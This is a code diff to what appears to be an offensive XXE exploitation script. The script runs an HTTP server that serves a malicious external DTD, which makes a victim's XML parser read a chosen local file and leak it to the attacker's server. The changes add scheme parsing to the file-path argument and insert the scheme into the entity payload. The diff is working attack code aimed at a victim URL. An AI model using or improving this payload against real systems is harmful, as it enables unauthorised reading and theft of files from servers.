@@ -21,7 +21,7 @@ import requests
 import threading
 import argparse
 from argparse import RawTextHelpFormatter
-from urllib.parse import urlencode
+from urllib.parse import urlencode, urlparse
 import codecs
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -89,7 +89,7 @@ class XXE(BaseHTTPRequestHandler):
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
         #The variable lfi is a global one, containing the file location we want to read.
-        xml = """<!ENTITY % file SYSTEM "{}"><!ENTITY % t "<!ENTITY rrr SYSTEM 'file:///%file;.txt'>">%t;""".format(lfi)
+        xml = """<!ENTITY % file SYSTEM "{}://{}"><!ENTITY % t "<!ENTITY rrr SYSTEM 'file:///%file;.txt'>">%t;""".format(scheme, lfi)
         xml = bytearray(xml,"utf8")
         self.wfile.write(xml)
 
@@ -163,7 +163,10 @@ formatter_class=RawTextHelpFormatter,
     args = parser.parse_args()
 
     outputFile = args.o.strip()
-    lfi = args.f.strip()
+    f = args.f.strip()
+    up = urlparse(f)
+    lfi = up.path
+    scheme = up.scheme
     serverIp = args.i.strip()
     port = args.p
     victimUrl = args.u.strip()
